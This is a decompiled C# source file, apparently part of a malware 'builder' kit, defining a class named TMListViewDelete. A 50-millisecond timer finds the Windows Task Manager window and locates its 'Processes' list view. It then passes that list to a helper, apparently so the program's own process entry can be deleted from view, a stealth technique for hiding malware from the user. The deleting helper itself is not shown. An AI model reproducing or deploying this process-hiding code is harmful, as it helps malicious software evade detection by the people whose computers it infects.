using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace nO_bUILDER;

[StandardModule]
internal sealed class TMListViewDelete
{
	private delegate int EnumDelegate(IntPtr lngHwnd, int lngLParam);

	private const int LVM_FIRST = 4096;

	private const int LVM_DELETECOLUMN = 4124;

	private const int LVM_GETITEMCOUNT = 4100;

	private const int LVM_SORTITEMS = 4144;

	private const int LVM_DELETEITEM = 4104;

	private const int LVM_GETNEXTITEM = 4108;

	private const int LVM_GETITEM = 4171;

	private static Timer t = new Timer();

	private static IntPtr hwnd;

	private static string controls;

	public static string MyProc;

	private static IntPtr ProcLV = IntPtr.Zero;

	public static bool Running
	{
		get
		{
			if (t.get_Enabled())
			{
				return true;
			}
			return false;
		}
		set
		{
			if (value)
			{
				MyProc = Process.GetCurrentProcess().ProcessName;
				if (t.get_Interval() != 50)
				{
					Timer val = t;
					t.add_Tick((EventHandler)t_Tick);
					val.set_Interval(50);
					val.set_Enabled(true);
					val.Start();
					val = null;
				}
				else
				{
					t.set_Enabled(true);
					t.Start();
				}
			}
			else
			{
				t.set_Enabled(false);
				t.Stop();
				ProcLV = IntPtr.Zero;
			}
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SendMessageA(IntPtr Hwnd, int wMsg, int wParam, int lParam);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int EnumChildWindows(IntPtr hWndParent, EnumDelegate lpEnumFunc, int lParam);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long GetClassNameA(long hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, long nMaxCount);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "GetClassNameA", ExactSpelling = true, SetLastError = true)]
	private static extern int GetClassNameA_1(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(IntPtr hWnd, StringBuilder lpString, int cch);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextLengthA(IntPtr hWnd);

	private static void t_Tick(object sender, EventArgs e)
	{
		if (ProcLV == IntPtr.Zero)
		{
			string lpClassName = null;
			string lpWindowName = "Windows Task Manager";
			hwnd = (IntPtr)FindWindowA(ref lpClassName, ref lpWindowName);
			if (hwnd != (IntPtr)0)
			{
				EnumChildWindows(hwnd, EnumChildWindows, 0);
			}
		}
		else
		{
			GetItems.GetListView(hwnd, ProcLV);
		}
	}

	private static int EnumChildWindows(IntPtr lngHwnd, int lngLParam)
	{
		string @class = GetClass(lngHwnd);
		string titleText = GetTitleText(lngHwnd);
		if (Strings.InStr(@class.ToString(), "SysListView32", (CompareMethod)0) != 0 && Strings.InStr(titleText, "Processes", (CompareMethod)0) != 0)
		{
			ProcLV = lngHwnd;
		}
		_ = lngHwnd + ", " + @class + ", " + titleText;
		return 1;
	}

	private static string GetClass(IntPtr handle)
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Length = 255;
		GetClassNameA_1(handle, stringBuilder, stringBuilder.Length);
		return stringBuilder.ToString();
	}

	private static string GetTitleText(IntPtr handle)
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Length = checked(GetWindowTextLengthA(handle) + 1);
		GetWindowTextA(handle, stringBuilder, stringBuilder.Length);
		return stringBuilder.ToString();
	}
}
